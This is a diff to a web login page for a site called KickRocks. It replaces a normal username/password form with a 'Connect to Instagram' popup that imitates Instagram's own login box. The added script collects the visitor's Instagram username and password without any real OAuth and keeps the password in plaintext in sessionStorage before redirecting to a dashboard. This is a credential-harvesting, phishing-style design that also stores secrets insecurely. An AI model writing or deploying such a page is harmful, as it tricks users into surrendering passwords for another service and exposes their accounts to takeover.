@@ -5,53 +5,47 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login - KickRocks</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
     :root{
-            --purple: #833ab4;;
-            --pink: #fd1d73;
-            --orange: #ffc073;
-            --ig-gradient: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-            --ig-gradient-full:linear-gradient(135deg, #fcb045 0%, #dc2743 40%, #833ab4 80%, #405de6 100%);
-        }
-    
+      --purple: #833ab4;
+      --pink: #fd1d73;
+      --orange: #ffc073;
+      --ig-gradient-full: linear-gradient(135deg, #fcb045 0%, #dc2743 40%, #833ab4 80%, #405de6 100%);
+    }
+
     body {
       height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
       background: linear-gradient(135deg, #1a0a2e 0%, #2d1155 30%, #4a0e2e 60%, #1a0a2e 100%);
-      background-attachment: scroll;
       min-height: 100vh;
     }
+
     .login-container {
       width: 100%;
       max-width: 350px;
       padding: 30px;
       border: 1px solid #eee;
-      background-color:white;
+      background-color: white;
       border-radius: 12px;
       text-align: center;
     }
-    .logo { 
-      font-size: 1.9rem; 
-      font-weight: 600; 
+
+    .logo {
+      font-size: 1.9rem;
+      font-weight: 600;
       background: var(--ig-gradient-full);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
-      margin-bottom: 10px; 
+      margin-bottom: 10px;
     }
-    .subtitle { font-size: 1.12rem; color: black; margin-bottom: 20px; }
 
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 12px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-    }
-    input:focus { outline: none; border-color: #6a0dad; }
+    .subtitle { font-size: 1.12rem; color: black; margin-bottom: 20px; }
 
     button {
       width: 100%;
@@ -65,63 +59,123 @@
       font-size: 0.85rem;
       margin-top: 5px;
     }
-    button:hover {  background: var(--ig-gradient-full); }
-    button:disabled { background: #aaa; cursor: not-allowed; }
 
-    .error { color: red; font-size: 0.85rem; margin-top: 10px; display: none; }
+    button:hover { background: var(--ig-gradient-full); }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+    }
+
+    input:focus { outline: none; border-color: #6a0dad; }
+
     .hint { font-size: 0.8rem; color: #999; margin-top: 16px; }
+
+    .popup {
+      display: none;
+      position: fixed;
+      z-index: 999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.65);
+    }
+
+    .popup-content {
+      background: white;
+      width: 90%;
+      max-width: 360px;
+      margin: 120px auto;
+      padding: 30px;
+      border-radius: 14px;
+      text-align: center;
+      position: relative;
+    }
+
+    .close {
+      position: absolute;
+      right: 18px;
+      top: 12px;
+      font-size: 26px;
+      cursor: pointer;
+    }
+
+    .error {
+      color: red;
+      font-size: 0.85rem;
+      margin-top: 10px;
+      display: none;
+    }
   </style>
 </head>
+
 <body>
-<div class="login-container">
-  <div class="logo">KickRocks</div>
-  <div class="subtitle">Login to continue</div>
 
-  <form onsubmit="login(event)">
-    <input type="text" id="username" placeholder="Username" required />
-    <input type="password" id="password" placeholder="Password" required />
-    <button type="submit" id="submitBtn">Login</button>
-  </form>
+  <div class="login-container">
+    <div class="logo">KickRocks</div>
+    <div class="subtitle">Login using Instagram</div>
 
-  <div class="error" id="errorMsg">Invalid username or password.</div>
-  <div class="hint">Demo: username <strong>admin</strong> / password <strong>1234</strong></div>
-</div>
+    <button onclick="openInstagramPopup()">Connect to Instagram</button>
 
-<script>
-  async function login(e) {
-    e.preventDefault();
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value;
-    const btn      = document.getElementById('submitBtn');
-    const errorMsg = document.getElementById('errorMsg');
+    <div class="hint">
+      First-time users will connect their Instagram login.
+    </div>
+  </div>
 
-    errorMsg.style.display = 'none';
-    btn.disabled = true;
-    btn.textContent = 'Logging in...';
+  <div id="instagramPopup" class="popup">
+    <div class="popup-content">
+      <span class="close" onclick="closeInstagramPopup()">&times;</span>
 
-    try {
-      const res  = await fetch('/api/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
-      });
-      const data = await res.json();
+      <div class="logo">Instagram</div>
+      <div class="subtitle">Log in to Instagram</div>
 
-      if (data.success) {
-        sessionStorage.setItem('user', JSON.stringify(data.user));
-        window.location.href = '/dashboard.html';
-      } else {
-        errorMsg.style.display = 'block';
-        btn.disabled = false;
-        btn.textContent = 'Login';
-      }
-    } catch (err) {
-      errorMsg.textContent = 'Could not reach server. Is the backend running?';
-      errorMsg.style.display = 'block';
-      btn.disabled = false;
-      btn.textContent = 'Login';
+      <form onsubmit="loginWithInstagram(event)">
+        <input type="text" id="instagramLogin" placeholder="Phone number, username, or email" required />
+        <input type="password" id="instagramPassword" placeholder="Password" required />
+        <button type="submit">Log In</button>
+      </form>
+
+      <div class="error" id="errorMsg">Please enter your Instagram login information.</div>
+    </div>
+  </div>
+
+  <script>
+    function openInstagramPopup() {
+      document.getElementById("instagramPopup").style.display = "block";
     }
-  }
-</script>
+
+    function closeInstagramPopup() {
+      document.getElementById("instagramPopup").style.display = "none";
+    }
+
+    function loginWithInstagram(e) {
+      e.preventDefault();
+
+      const instagramLogin = document.getElementById("instagramLogin").value.trim();
+      const instagramPassword = document.getElementById("instagramPassword").value;
+      const errorMsg = document.getElementById("errorMsg");
+
+      if (!instagramLogin || !instagramPassword) {
+        errorMsg.style.display = "block";
+        return;
+      }
+
+      const user = {
+        id: 1,
+        username: instagramLogin,
+        instagramLogin: instagramLogin,
+        instagramConnected: true
+      };
+
+      sessionStorage.setItem("user", JSON.stringify(user));
+      sessionStorage.setItem("instagramPassword", instagramPassword);
+
+window.location.href = "/dashboard.html";    }
+  </script>
+
 </body>
 </html>
